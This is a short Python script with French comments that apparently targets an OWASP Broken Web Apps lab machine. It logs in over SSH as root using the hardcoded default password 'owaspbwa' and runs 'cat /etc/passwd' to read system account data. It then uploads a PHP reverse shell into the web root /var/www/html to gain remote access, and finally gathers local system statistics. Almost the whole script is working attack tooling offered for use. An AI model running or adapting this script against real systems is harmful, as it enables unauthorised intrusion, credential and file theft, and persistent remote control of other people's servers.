import paramiko
import psutil
import os

# Configuration de la connexion SSH
ssh_host = '192.168.8.135'
ssh_port = 22
ssh_username = 'root'  # Remplacez par le nom d'utilisateur approprié
ssh_password = 'owaspbwa'  # Remplacez par le mot de passe approprié

# Fonction pour se connecter en SSH et exécuter des commandes
def ssh_connect_and_execute(host, port, username, password, command):
    try:
        # Création d'une instance SSHClient
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username, password)

        # Exécution de la commande
        stdin, stdout, stderr = ssh.exec_command(command)
        print(f"Command: {command}")
        print("Output:")
        print(stdout.read().decode())
        print("Errors:")
        print(stderr.read().decode())

        # Fermeture de la connexion SSH
        ssh.close()
    except Exception as e:
        print(f"Failed to connect or execute command: {e}")

# Fonction pour télécharger un reverse shell (exemple simple)
def upload_reverse_shell(host, port, username, password, local_path, remote_path):
    try:
        # Création d'une instance SSHClient
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username, password)
        
        # Création d'une instance SFTP
        sftp = ssh.open_sftp()
        sftp.put(local_path, remote_path)
        print(f"Uploaded {local_path} to {remote_path}")
        
        # Fermeture de la connexion SFTP et SSH
        sftp.close()
        ssh.close()
    except Exception as e:
        print(f"Failed to upload file: {e}")

# Fonction pour collecter des informations système avec psutil
def collect_system_info():
    print("\nSystem Information:")
    print(f"CPU Usage: {psutil.cpu_percent(interval=1)}%")
    print(f"Memory Usage: {psutil.virtual_memory().percent}%")
    print(f"Disk Usage: {psutil.disk_usage('/').percent}%")
    print(f"Processes Running: {len(psutil.pids())}")

# Exemple de commande pour obtenir des informations sensibles (à adapter)
command = 'cat /etc/passwd'  # Exemple de commande pour lire le fichier des utilisateurs
print(f"\nExecuting command on {ssh_host}:")
ssh_connect_and_execute(ssh_host, ssh_port, ssh_username, ssh_password, command)

# Exemple de téléchargement d'un reverse shell (à adapter)
local_reverse_shell_path = 'reverse_shell.php'  # Chemin du fichier local
remote_reverse_shell_path = '/var/www/html/reverse_shell.php'  # Chemin distant
print(f"\nUploading reverse shell to {ssh_host}:")
upload_reverse_shell(ssh_host, ssh_port, ssh_username, ssh_password, local_reverse_shell_path, remote_reverse_shell_path)

# Collecte d'informations système locales
print("\nCollecting local system information:")
collect_system_info()
